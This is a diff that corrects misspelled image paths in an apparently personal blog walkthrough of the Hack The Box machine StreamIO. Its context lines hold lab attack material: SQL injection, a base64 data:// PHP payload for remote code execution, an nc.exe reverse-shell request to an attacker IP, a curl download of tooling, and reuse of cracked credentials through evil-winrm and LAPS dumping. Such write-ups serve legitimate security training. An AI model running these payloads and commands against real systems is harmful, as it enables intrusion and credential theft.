@@ -92,7 +92,7 @@ The server still resolving to http://www.streamio.htb/, so add it also in the fi
 Any of the three will show me the default web:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_1_web.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_1_web.png" width="90%"/>
 </p>
 
 Let's take a look first at the DNS first to enumerate the assets:
@@ -166,7 +166,7 @@ watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79]
 I added the watch.streamio.htb to the /etc/hosts and runned gobuster again over it:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_2_watch.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_2_watch.png" width="90%"/>
 </p>
 
 
@@ -201,21 +201,21 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 Most relevant path was search.php, where we can see a film browser:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_3_search.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_3_search.png" width="90%"/>
 </p>
 
 
 I let the sqlmap run in the background while investigating the rest of the website with the following request:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_4_sql.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_4_sql.png" width="90%"/>
 </p>
 
 
 We could see that with that inyection, it displayed all the movies, which means that the query could be working. Testing for the following injection (with a **1** previous to the closing quote, I found that all movies displayed end on 1... It could be some kind of regex for [_contains_ keyword](https://www.sqlshack.com/t-sql-regex-commands-in-sql-server/) with the % (sql wildcard) at the end of the string.
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_5_sql_end.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_5_sql_end.png" width="90%"/>
 </p>
 
 
@@ -223,7 +223,7 @@ Testing for UNION injection, we found that when a query with no result is provid
 
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_6_union.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_6_union.png" width="90%"/>
 </p>
 
 A little walkthrough on the payloads I tested (I added a quote on the previous line for each payload so the syntax is fiendly on this blog):
@@ -343,7 +343,7 @@ admin:665a50ac9eaa781e4f7f04199db97a11
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/1_7_passwords.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/1_7_passwords.png" width="90%"/>
 </p>
 
 
@@ -374,7 +374,7 @@ admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
 Now, let's recall the /admin path on gobuster, so let's login with some user and visit that path. Actually, only the user yoshihide worked on the login with its credential: **yoshihide:66boysandgirls..** . We end up on an admin panel with several options:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/2_0_admin.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/2_0_admin.png" width="90%"/>
 </p>
 
 We can see that the different tabs have different parameters:
@@ -389,7 +389,7 @@ https://streamio.htb/admin/?message=
 And it uses the ID to delete them:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/2_0_admin.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/2_0_admin.png" width="90%"/>
 </p>
 
 
@@ -410,7 +410,7 @@ user                    [Status: 200, Size: 2073, Words: 146, Lines: 63]
 Playing around with the parameter, I could not achieve anything with the POST but with the GET and the _index.php_ as value I got an extrange response saying error:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/2_3_error.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/2_3_error.png" width="90%"/>
 </p>
 
 
@@ -421,7 +421,7 @@ GET /admin/?debug=php://filter/read=string.toupper|string.rot13|string.tolower/r
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/2_4_rot.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/2_4_rot.png" width="90%"/>
 </p>
 
 
@@ -692,7 +692,7 @@ include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7
 And we can see the RCE:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/2_5_rce.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/2_5_rce.png" width="90%"/>
 </p>
 
 
@@ -721,13 +721,13 @@ POST /admin/?debug=master.php&cmd=cmd+/c+C:\\Downloads\\nc.exe+-e+powershell+10.
 Once we send the request, we get the revshell:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/3_0_in.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/3_0_in.png" width="90%"/>
 </p>
 
 Checking the users in the machine, we can see the nikk37:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/3_1_users.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/3_1_users.png" width="90%"/>
 </p>
 
 Going back to the enumerated assets, I checked the unused database credentials that we found in the php code and probably the database will be Microsoft SQL, therefore the service might be running on the default port 1433. Since we cannot list the ports used (due to the low priviledges of this user), I will use port forwarding with chisel se I can access to the sql server from my machine.
@@ -763,13 +763,13 @@ SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;
 Master db has the same users that we obtained from the SQLi
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/5_2_master_db.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_2_master_db.png" width="90%"/>
 </p>
 
 But in the backup one we can see our target user:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/5_3_backup_db.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_3_backup_db.png" width="90%"/>
 </p>
 
 
@@ -804,14 +804,14 @@ Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/5_3_cracked.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_3_cracked.png" width="90%"/>
 </p>
 
 
 Now with the cracked users and passwords, we can try to log into the machine. Let's test the users with crackmapexec. nikk37 shows no pwned on smb, so it won't be administrator, but it has winrm enabled, so we can log in with it:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/5_4_cme.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/5_4_cme.png" width="90%"/>
 </p>
 
 
@@ -820,7 +820,7 @@ evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.com
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/6_1_user.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/6_1_user.png" width="80%"/>
 </p>
 
 
@@ -838,7 +838,7 @@ curl http://10.10.14.132:5454/Windows/winPEASany.exe -o win.exe
 We can see that there is a Firefox credential file, let's download it to check it on local:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/7_0_firefox.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/7_0_firefox.png" width="80%"/>
 </p>
 
 
@@ -890,7 +890,7 @@ Password: 'password@12'
 We got many credentials, let's test them with crackmapexec:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/7_1_new_users.png" width="80%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/7_1_new_users.png" width="80%"/>
 </p>
 
 
@@ -906,7 +906,7 @@ We have that the crads **JDgodd:JDg0dd1s@d0p3cr3@t0r** are valid on smb, no pwne
 Once we have marked the users we owner, let's check the shortest path from each of them:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/8_1_bloodjdgod.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/8_1_bloodjdgod.png" width="90%"/>
 </p>
 
 The most obvious priv esc path is with user JDgodd since it has Read LAPS passwords over the DC. Looking for information about the attack, I found [this website](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) and a tool called [LAPSDumper](https://github.com/n00py/LAPSDumper). With crackmapexec could not login with any of the password for the JDgodd user.
@@ -929,7 +929,7 @@ Add-DomainGroupMember -Identity 'Core Staff' -Members nikk37 -Credential $Cred
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/8_2_added.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/8_2_added.png" width="90%"/>
 </p>
 
 
@@ -950,7 +950,7 @@ LAPS        10.10.11.158    389    DC               Computer: DC$               
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/9_0_cme.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/9_0_cme.png" width="90%"/>
 </p>
 
 
@@ -961,13 +961,13 @@ evil-winrm -i 10.10.11.158 -u administrator -p ',-96;;;dIO7dQ/'
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/9_1_root.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/9_1_root.png" width="90%"/>
 </p>
 
 And the flag is on the Martin user:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/streamio/9_2_martin.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/streamio/9_2_martin.png" width="90%"/>
 </p>
 
 
